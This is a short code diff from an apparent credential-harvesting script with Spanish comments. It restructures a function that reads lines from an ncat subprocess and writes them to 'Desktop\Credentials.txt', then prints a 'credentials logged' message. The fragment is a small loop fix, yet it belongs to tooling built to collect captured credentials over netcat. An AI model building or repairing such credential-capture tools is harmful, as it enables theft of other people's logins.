@@ -45,13 +45,12 @@ location = get_user_path() + "Desktop\\Credentials.txt"
 
 def recv_nc():
     encodings = ["utf-8", "latin-1", "ascii"]  # Lista de codificaciones a probar
-    for line in ncat.stdout:
-        try:
-            for line in ncat.stdout:
-                write_fileBytes(line, location)
+    try:
+        for line in ncat.stdout:
+            write_fileBytes(line, location)
 
-        except ValueError:
-            pass
+    except ValueError:
+        pass
 
     write_fileBytes("\n\n[!] CREDENTIALS LOGED SUCSSESFULLY\n".encode(), location)
     #print(Fore.LIGHTYELLOW_EX + "\n[!] CREDENTIALS LOGED SUCSSESFULLY\n" + Fore.RESET)
